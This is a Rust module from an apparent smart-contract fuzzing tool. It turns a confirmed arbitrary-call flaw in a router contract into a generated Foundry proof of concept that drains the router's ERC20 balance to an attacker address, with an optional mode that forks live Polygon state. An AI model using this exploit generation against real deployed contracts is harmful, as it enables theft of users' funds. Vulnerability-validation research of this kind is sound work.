//! 机械合成：解析 witness calldata 的臂 3 router 头形 → 替换槽 →
//! 渲染 Foundry 工程文件。不逐字节手写 calldata：测试体的调用
//! 序列完全由 `abi.encodeWithSelector` / `abi.encodeCall` 在
//! Solidity 侧表达，参数（BALANCE / 地址 / 字节码 / registry 槽）
//! 由本模块从 poc.json 注入。

use std::fmt::Write as _;
use std::path::Path;

use alloy_primitives::U256;
use loom_fuzz_oracle::{hex_bytes, hex_u256, Poc};

/// 与 `loom-fuzz run` / `replay` 管线同一固定合约地址（poc.json v1
/// 未序列化合约地址，约定常量——见 oracle::replay）。
pub const ROUTER_ADDRESS: [u8; 20] = [0x22; 20];

/// forge-std 的 Vm cheatcode 地址（hevm cheat code 的 keccak 后
/// 160 位，foundry 惯例常量）。
const VM_ADDRESS: &str = "0x7109709ECfa91a80626fF3989D68f67F5b1DD12D";

/// 默认缴获全额：1_000_000e18（mint 给路由器的受害者资产量）。
pub fn default_balance() -> U256 {
    U256::from(1_000_000u64) * U256::from(10u64).pow(U256::from(18u64))
}

/// 默认攻击者：address(uint160(0xBEEF))。
pub fn default_attacker() -> [u8; 20] {
    let mut a = [0u8; 20];
    a[19] = 0xbe;
    a[18] = 0xef;
    a
}

/// L2 合成参数（测试可参数化复跑：不同 BALANCE/地址 → 文本随之
/// 变化，证明机械合成而非模板硬编码）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExploitParams {
    /// 缴获全额（mint 给 router 的受害者资产；终点断言 ==
    /// balanceOf(attacker)）。
    pub balance: U256,
    pub attacker: [u8; 20],
}

impl Default for ExploitParams {
    fn default() -> Self {
        ExploitParams {
            balance: default_balance(),
            attacker: default_attacker(),
        }
    }
}

/// pocgen 的 typed 错误（fail-closed）。
#[derive(Debug)]
pub enum PocgenError {
    /// 诚实降级：L1 非 confirmed 不进 L2。
    NotConfirmed { verdict: String },
    /// witness calldata 非臂 3 router 头形（无法机械解析）。
    BadShape(String),
    /// 字节码 hex 非法。
    BadCode(String),
    /// poc 字段非法。
    BadPoc(String),
    /// forge 不在 PATH。
    ForgeUnavailable(std::io::Error),
    /// forge test 红灯（带输出）。
    ForgeFailed { output: String },
    /// IO 落盘错误。
    Io(std::io::Error),
}

impl std::fmt::Display for PocgenError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PocgenError::NotConfirmed { verdict } => {
                write!(
                    f,
                    "诚实降级：poc verdict = {verdict:?}，非 confirmed 不进 L2"
                )
            }
            PocgenError::BadShape(s) => write!(f, "witness calldata 头形不可机械解析: {s}"),
            PocgenError::BadCode(s) => write!(f, "字节码 hex 非法: {s}"),
            PocgenError::BadPoc(s) => write!(f, "poc 字段非法: {s}"),
            PocgenError::ForgeUnavailable(e) => write!(f, "forge 不在 PATH: {e}"),
            PocgenError::ForgeFailed { output } => {
                write!(f, "forge test 红灯（fail-closed）:\n{output}")
            }
            PocgenError::Io(e) => write!(f, "IO 错误: {e}"),
        }
    }
}

impl std::error::Error for PocgenError {}

/// 有害动作集合（M0 只实现 ERC20 drain 臂；按族扩展的挂点）。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HarmfulAction {
    /// 对 ERC20 目标抽干路由器持仓：transferFrom(router, attacker,
    /// balance)，前提 allowance[router][router] ≥ balance（setUp
    /// vm.store 机械布置）。
    Erc20Drain,
}

/// 有害动作选择（机械）：M0 臂 3 primitive 对 ERC20 目标的唯一
/// 有害动作 = 抽干。未来按族/目标类型在此分发。
pub fn select_action() -> HarmfulAction {
    HarmfulAction::Erc20Drain
}

/// 臂 3 router 头形：witness calldata = selector + head（槽 0 = 目标
/// 地址，address-clean；末槽 = 尾指针，值 = 头宽）+ 尾（bytes 内容）。
/// 机械解析：n ∈ 1..=4 尝试匹配"末槽值 == n*32 且槽 0 地址洁净"，
/// 多解/无解即 BadShape（fail-closed）。
struct HeadShape {
    /// 头槽数（解析校验即用途：n 满足 末槽 == n*32 且槽 0 地址洁净；
    /// 渲染只需 selector——槽替换在 Solidity 侧由 abi.encode 完成）。
    #[allow(dead_code)]
    n: usize,
    selector: u32,
}

fn word(rest: &[u8], idx: usize) -> U256 {
    let mut w = [0u8; 32];
    w.copy_from_slice(&rest[idx * 32..idx * 32 + 32]);
    U256::from_be_bytes(w)
}

fn parse_head_shape(calldata: &[u8]) -> Result<HeadShape, PocgenError> {
    if calldata.len() < 4 + 32 {
        return Err(PocgenError::BadShape(format!(
            "calldata 不足一个头槽: {} 字节",
            calldata.len()
        )));
    }
    let selector = u32::from_be_bytes(calldata[..4].try_into().expect("len≥4"));
    let rest = &calldata[4..];
    let words = rest.len() / 32;
    let mut matches = Vec::new();
    for n in 1..=words.min(4) {
        if word(rest, n - 1) == U256::from(n as u64 * 32)
            && word(rest, 0) < (U256::from(1u64) << 160u64)
        {
            matches.push(n);
        }
    }
    match matches.len() {
        1 => Ok(HeadShape {
            n: matches[0],
            selector,
        }),
        0 => Err(PocgenError::BadShape(
            "无 n∈1..=4 满足 末槽==n*32 且 槽0 地址洁净（非臂 3 router 头形）".to_string(),
        )),
        _ => Err(PocgenError::BadShape(format!(
            "头形多解 n={matches:?}（无法确定尾指针槽）"
        ))),
    }
}

/// 入口：confirmed poc.json + 运行时字节码 → 生成 Foundry 工程并
/// 跑 forge test。绿灯返回 (工程路径, forge 输出摘要)；红灯 typed
/// error（fail-closed）。
pub fn generate_exploit(
    poc: &Poc,
    code_hex: &str,
    out_dir: &Path,
    fork: bool,
) -> Result<(std::path::PathBuf, String), PocgenError> {
    generate_exploit_with(poc, code_hex, out_dir, fork, &ExploitParams::default())
}

/// 参数化版（测试用：不同 BALANCE/地址复跑，断言文本随之变化）。
pub fn generate_exploit_with(
    poc: &Poc,
    code_hex: &str,
    out_dir: &Path,
    fork: bool,
    params: &ExploitParams,
) -> Result<(std::path::PathBuf, String), PocgenError> {
    // 诚实降级：L1 非 confirmed 不进 L2。
    if poc.verdict != "confirmed" {
        return Err(PocgenError::NotConfirmed {
            verdict: poc.verdict.clone(),
        });
    }
    let code = code_hex.trim().trim_start_matches("0x");
    if code.is_empty()
        || !code.len().is_multiple_of(2)
        || !code.bytes().all(|b| b.is_ascii_hexdigit())
    {
        return Err(PocgenError::BadCode(code_hex.to_string()));
    }
    let calldata = hex_bytes(&poc.tx.calldata).map_err(PocgenError::BadPoc)?;
    let shape = parse_head_shape(&calldata)?;
    let prestate: Vec<(U256, U256)> = poc
        .prestate
        .iter()
        .map(|(k, v)| Ok((hex_u256(k)?, hex_u256(v)?)))
        .collect::<Result<_, String>>()
        .map_err(PocgenError::BadPoc)?;

    let artifacts = ProjectArtifacts::render(&shape, &prestate, code, params, fork);
    artifacts.write(out_dir).map_err(PocgenError::Io)?;
    let summary = crate::project::forge_test(out_dir)?;
    Ok((out_dir.to_path_buf(), summary))
}

// ---------------------------------------------------------------------------
// 渲染（Solidity 模板；注入参数全部来自 poc.json / params）
// ---------------------------------------------------------------------------

/// 生成的工程工件（文件名 → 内容）。
pub struct ProjectArtifacts {
    pub files: Vec<(String, String)>,
}

impl ProjectArtifacts {
    fn render(
        shape: &HeadShape,
        prestate: &[(U256, U256)],
        code_hex: &str,
        params: &ExploitParams,
        fork: bool,
    ) -> Self {
        let mut files = vec![
            ("src/MockERC20.sol".into(), mock_erc20_sol()),
            ("src/IERC20.sol".into(), ierc20_sol()),
            ("src/Vm.sol".into(), vm_sol()),
            (
                "test/PoC.t.sol".into(),
                poc_test_sol(shape, prestate, code_hex, params),
            ),
            ("foundry.toml".into(), foundry_toml(fork)),
            ("README.md".into(), readme(fork)),
        ];
        if fork {
            files.push(("run.sh".into(), run_sh()));
        }
        ProjectArtifacts { files }
    }

    fn write(&self, out_dir: &Path) -> std::io::Result<()> {
        for (name, content) in &self.files {
            let path = out_dir.join(name);
            if let Some(parent) = path.parent() {
                std::fs::create_dir_all(parent)?;
            }
            std::fs::write(path, content)?;
        }
        Ok(())
    }
}

fn addr_hex(a: [u8; 20]) -> String {
    let mut s = String::with_capacity(42);
    s.push_str("0x");
    for b in a {
        let _ = write!(s, "{b:02x}");
    }
    s
}

/// 攻击者渲染为 `address(uint160(0x…))`（任务形态；避开 address
/// 字面量 checksum 校验，且对任意攻击者值稳）。
fn attacker_expr(a: [u8; 20]) -> String {
    format!(
        "address(uint160(0x{}))",
        u256_hex64(U256::from_be_bytes({
            let mut w = [0u8; 32];
            w[12..].copy_from_slice(&a);
            w
        }))
        .trim_start_matches('0')
    )
}

fn u256_hex64(v: U256) -> String {
    let mut s = String::with_capacity(64);
    for b in v.to_be_bytes::<32>() {
        let _ = write!(s, "{b:02x}");
    }
    s
}

fn mock_erc20_sol() -> String {
    r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @dev 最小 ERC20（loom-fuzz pocgen 自带，工程零外部依赖）。
/// 槽布局钉死（pocgen vm.store 机械公式的依据）：
///   balanceOf  → slot 0（keccak(abi.encode(account, 0))）
///   allowance  → slot 1（keccak(abi.encode(spender,
///                keccak(abi.encode(owner, 1))))）
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allowance");
            allowance[from][msg.sender] = allowed - amount;
        }
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}
"#
    .to_string()
}

fn ierc20_sol() -> String {
    r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @dev PoC 的受害资产接口（pocgen 自带；selector 由 abi.encodeCall
/// 编译期推导，测试体不出现硬编码 selector 串）。
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
"#
    .to_string()
}

fn vm_sol() -> String {
    r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @dev 最小 Vm cheatcode 接口（pocgen 自带，免 forge-std 依赖；
/// 自写 interface Vm 是 foundry 惯例）。只要 etch/store/prank。
interface Vm {
    function etch(address target, bytes calldata code) external;
    function store(address target, bytes32 slot, bytes32 value) external;
    function prank(address msgSender) external;
}
"#
    .to_string()
}

fn poc_test_sol(
    shape: &HeadShape,
    prestate: &[(U256, U256)],
    code_hex: &str,
    params: &ExploitParams,
) -> String {
    let router = addr_hex(ROUTER_ADDRESS);
    let attacker = attacker_expr(params.attacker);
    let balance_dec = params.balance.to_string();
    let selector = format!("{:#06x}", shape.selector);

    // registry/prestate 布置：每条一个 vm.store。
    let mut stores = String::new();
    for (slot, value) in prestate {
        let _ = writeln!(
            stores,
            "        vm.store(ROUTER, 0x{}, bytes32(uint256(0x{})));",
            u256_hex64(*slot),
            u256_hex64(*value)
        );
    }
    // VICTIM_ASSET 的 registry 成员布置：价值影响前提（router 的
    // registry 接受该资产为 service——与 poc.json 的 registry
    // prestate 同形，机械推导槽 = keccak(abi.encode(token, 0))）。
    stores
        .push_str("        // VICTIM_ASSET 作为 service 的 registry 成员布置（价值影响前提）。\n");
    stores.push_str(
        "        vm.store(ROUTER, keccak256(abi.encode(address(token), uint256(0))), bytes32(uint256(1)));\n",
    );

    format!(
        r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {{MockERC20}} from "../src/MockERC20.sol";
import {{IERC20}} from "../src/IERC20.sol";
import {{Vm}} from "../src/Vm.sol";

/// L2 exploit PoC（loom-fuzz-pocgen 机械合成，勿手改——重生成覆盖）。
///
/// L1 primitive（oracle confirmed）：路由器任意目标 + 任意 calldata
/// 呼出（msg.sender = 路由器）。L2 组装：目标 = VICTIM_ASSET，
/// calldata = transferFrom(ROUTER, ATTACKER, BALANCE)——把 primitive
/// 变成对路由器持仓的盗窃。
contract PoC {{
    Vm constant vm = Vm({VM_ADDRESS});
    address constant ROUTER = {router};
    address constant ATTACKER = {attacker};
    uint256 constant BALANCE = {balance_dec};

    function testExploit() public {{
        // 资产模型：受害者 = 路由器合约的关联持仓（全额 mint 给它）。
        MockERC20 token = new MockERC20();
        token.mint(ROUTER, BALANCE);

        // 目标合约：poc.json 的运行时字节码 + prestate 布置。
        vm.etch(ROUTER, hex"{code_hex}");
{stores}
        // 有害动作前提：allowance[ROUTER][ROUTER] = BALANCE（标准
        // ERC20 布局槽公式，MockERC20 槽位钉死注释见 src/MockERC20.sol）。
        vm.store(
            address(token),
            keccak256(abi.encode(ROUTER, keccak256(abi.encode(ROUTER, uint256(1))))),
            bytes32(BALANCE)
        );

        // calldata 机械合成（不逐字节手写）：service 槽 = VICTIM_ASSET，
        // request 槽 = abi.encodeCall(IERC20.transferFrom, …)。
        bytes memory request =
            abi.encodeCall(IERC20.transferFrom, (ROUTER, ATTACKER, BALANCE));
        bytes memory data = abi.encodeWithSelector({selector}, address(token), request);

        vm.prank(ATTACKER);
        (bool ok, bytes memory returndata) = payable(ROUTER).call(data);

        // ① L1 primitive：转发成功。
        require(ok, string.concat("L1: forwardRequest failed: ", _err(returndata)));
        // ② L2 缴获：attacker 余额严格等于转入全额（终点断言）。
        require(
            token.balanceOf(ATTACKER) == BALANCE,
            string.concat("L2: drained amount mismatch: ", _toString(token.balanceOf(ATTACKER)))
        );
    }}

    function _err(bytes memory returndata) internal pure returns (string memory) {{
        if (returndata.length < 68) return "no revert reason";
        // abi.encode(string) 头 4+32：跳过的前 4 字节是 Error(string) 选择子。
        uint256 offset;
        for (uint256 i = 4; i < 36; i++) {{
            offset = (offset << 8) | uint8(returndata[i]);
        }}
        bytes memory reason = new bytes(offset);
        for (uint256 i = 0; i < offset && 36 + i < returndata.length; i++) {{
            reason[i] = returndata[36 + i];
        }}
        return string(reason);
    }}

    function _toString(uint256 v) internal pure returns (string memory) {{
        if (v == 0) return "0";
        bytes memory buf = new bytes(78);
        uint256 i = buf.length;
        while (v > 0) {{
            i--;
            buf[i] = bytes1(uint8(48 + (v % 10)));
            v /= 10;
        }}
        bytes memory out = new bytes(buf.length - i);
        for (uint256 j = 0; j < out.length; j++) {{
            out[j] = buf[i + j];
        }}
        return string(out);
    }}
}}
"#
    )
}

fn foundry_toml(fork: bool) -> String {
    let mut s = String::new();
    s.push_str(
        r#"[profile.default]
src = "src"
out = "out"
libs = []
solc = "0.8.19"
optimizer = true
optimizer_runs = 200

"#,
    );
    if fork {
        s.push_str(
            r#"# fork 模式（BlockMachine）：eth_rpc_url 从环境变量插值；
# Authorization 头不能进 toml，由 run.sh 在 forge 命令行附加
# （-H "Authorization: Bearer $BLOCKMACHINE_API_KEY"）。
[profile.fork]
eth_rpc_url = "${BLOCKMACHINE_RPC_URL}"
"#,
        );
    }
    s
}

fn readme(fork: bool) -> String {
    let mut s = String::new();
    s.push_str(
        r#"# loom-fuzz exploit PoC（L2 价值影响层）

机械合成自 confirmed 的 poc.json（loom-fuzz-pocgen）——**forge test
绿灯 = 终判**。工程零外部依赖：自写 MockERC20 / IERC20 / Vm，不依赖
forge-std。

```sh
forge test          # 字节码模式（默认，离线）
```

## 结构

- `src/MockERC20.sol`：受害资产。槽布局钉死：balanceOf = slot 0、
  allowance = slot 1（PoC 里 vm.store 机械公式的依据）。
- `src/IERC20.sol` / `src/Vm.sol`：最小接口（selector 由
  `abi.encodeCall` 编译期推导，测试体无硬编码 calldata 字节）。
- `test/PoC.t.sol`：setUp 布置（etch 路由器 + registry prestate +
  allowance 槽）→ `vm.prank(ATTACKER)` → 一次 forwardRequest →
  L1 `require(ok)` + L2 `require(balanceOf(ATTACKER) == BALANCE)`。

"#,
    );
    if fork {
        s.push_str(
            r#"## fork 模式（BlockMachine）

```sh
export BLOCKMACHINE_RPC_URL=...    # 默认 https://rpc-polygon.blockmachine.io
export BLOCKMACHINE_API_KEY=...    # 空 = 直接无 key 连接（免费档）
./run.sh                           # 有 key 时自动带 Authorization: Bearer
```

fork 模式的资产模型 = 链上真实余额：不 mint / 不 vm.store 余额，
只对 registry prestate 做 store；目标合约在链上已真实存在时跳过
vm.etch（本工程默认仍 etch 字节码模式布置，差异见 test 注释）。
连接语义：API key 为空直接 `--fork-url` 连；非空经 `run.sh` 的
anvil 代理附加 `Authorization: Bearer` 头（forge test 1.5.1 无
header 旗，anvil --fork-header 是 foundry 族内惯用通路；
foundry.toml 不能带头）。
"#,
        );
    }
    s
}

fn run_sh() -> String {
    r#"#!/usr/bin/env bash
# BlockMachine fork 模式（pocgen 生成）：
#   BLOCKMACHINE_API_KEY 为空 = 直接无 key 连接（免费档）；
#   非空 = Bearer 头经 anvil 代理附加（forge test 1.5.1 无 header 旗，
#   anvil --fork-header 是 foundry 族内惯用通路）。
set -euo pipefail
RPC="${BLOCKMACHINE_RPC_URL:-https://rpc-polygon.blockmachine.io}"
KEY="${BLOCKMACHINE_API_KEY:-}"
if [ -z "$KEY" ]; then
  exec forge test --fork-url "$RPC" "$@"
fi

PORT="${LOOM_FUZZ_ANVIL_PORT:-19545}"
anvil --fork-url "$RPC" --fork-header "Authorization: Bearer $KEY" --port "$PORT" &
ANVIL_PID=$!
trap 'kill "$ANVIL_PID" 2>/dev/null || true' EXIT
# 等 anvil 就绪（轮询本地端口）。
for _ in $(seq 1 50); do
  if cast block-number --rpc-url "http://127.0.0.1:$PORT" >/dev/null 2>&1; then
    break
  fi
  sleep 0.2
done
forge test --fork-url "http://127.0.0.1:$PORT" "$@"
"#
    .to_string()
}
